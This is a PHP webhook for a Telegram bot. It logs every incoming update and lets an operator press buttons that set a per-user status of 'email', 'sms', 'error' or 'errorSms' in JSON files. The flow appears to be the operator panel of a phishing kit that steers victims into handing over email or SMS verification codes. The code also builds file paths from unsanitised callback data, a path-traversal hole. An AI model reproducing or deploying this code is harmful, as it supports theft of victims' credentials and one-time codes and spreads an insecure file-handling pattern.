<?php
header('Content-Type: text/html; charset=utf-8');
include "config.php";

$data = file_get_contents('php://input');
$data = json_decode($data, true);
$bliay = $datee = date("Y-m-d H:i:s", time());
file_put_contents(__DIR__ . '/logs/message'.$bliay.'.txt', print_r($data, true));

if (!empty($data['message']['text'])  || !empty($data['chat_join_request']['user_chat_id']) || !empty($data['callback_query']['data']) || array_key_exists('photo', $data['message']) || array_key_exists('sticker', $data['message']) || array_key_exists('voice', $data['message']))
{
    if (!empty($data['callback_query']['data'])) {
        $callback_query_id =  $data['callback_query']['id'];
        $chat_id = $data['callback_query']['from']['id'];
        $user_name = $data['callback_query']['from']['username'];
        $first_name = $data['callback_query']['from']['first_name'];
        $last_name = $data['callback_query']['from']['last_name'];
        $text = 'callback';
        $callback_query = $data['callback_query']['data'];

        if(!empty($data['callback_query']['message']['caption'])){
            $old_text = $data['callback_query']['message']['caption'];
        }else{
            $old_text = $data['callback_query']['message']['text'];
        }

        $testdate = trim($data['callback_query']['message']['date']);
        $message_id = $data['callback_query']['message']['message_id'];

    } else {
        $chat_id = $data['message']['from']['id'];
        $user_name = $data['message']['from']['username'];
        $first_name = $data['message']['from']['first_name'];
        $last_name = $data['message']['from']['last_name'];
        $text = trim($data['message']['text']);
        $testdate = trim($data['message']['date']);
        $message_id = $data['message']['message_id'];
    }

    if(empty($user_name) || $user_name == false || $user_name == null) {
        $user_name = "none";
    }

    $chat_info = $data['message']['chat']['id'];
    $startMenuText = "Привет, мне жаль но тут ничего интересного ты не найдешь";

    if ($text != 'callback')
    {
        switch ($text) {
            case '/start':
                message_to_telegram($bot_token, $chat_id, $startMenuText);
                exit;
            case '/info2':
                message_to_telegram($bot_token, $chat_info, $chat_info."\n".$user_name);
                exit;
        }

    }elseif ($text == 'callback') {
        $text_array = explode("|", $callback_query);
        $name = trim($text_array[0]);
        $action = trim($text_array[1]);

        switch ($name) {
            case 'error':
                $file_path = 'api/users/'.$action.'.json';
                if(file_exists($file_path)) {
                    $file_content = file_get_contents($file_path);
                    $data = json_decode($file_content, true);
                    $data['status'] = 'error';
                    $updated_content = json_encode($data);
                    file_put_contents($file_path, $updated_content);
                }
                answerCallback($bot_token, $callback_query_id, '❌ Error ❌');
                exit;
            case 'email':
                $file_path = 'api/users/'.$action.'.json';
                if(file_exists($file_path)) {
                    $file_content = file_get_contents($file_path);
                    $data = json_decode($file_content, true);
                    $data['status'] = 'email';
                    $updated_content = json_encode($data);
                    file_put_contents($file_path, $updated_content);
                }
                answerCallback($bot_token, $callback_query_id, '✅ Email ✅');
                exit;
            case 'sms':
                $file_path = 'api/users/'.$action.'.json';
                if(file_exists($file_path)) {
                    $file_content = file_get_contents($file_path);
                    $data = json_decode($file_content, true);
                    $data['status'] = 'sms';
                    $updated_content = json_encode($data);
                    file_put_contents($file_path, $updated_content);
                }
                answerCallback($bot_token, $callback_query_id, '✅ SMS ✅');
                exit;
            case 'errorSms':
                $file_path = 'api/users/'.$action.'.json';
                if(file_exists($file_path)) {
                    $file_content = file_get_contents($file_path);
                    $data = json_decode($file_content, true);
                    $data['status'] = 'errorSms';
                    $updated_content = json_encode($data);
                    file_put_contents($file_path, $updated_content);
                }
                answerCallback($bot_token, $callback_query_id, '❌ SMS Error ❌');
                exit;
        }
    }
}


file_put_contents(__DIR__ . '/logs/error.txt', print_r(error_get_last(), true));

exit;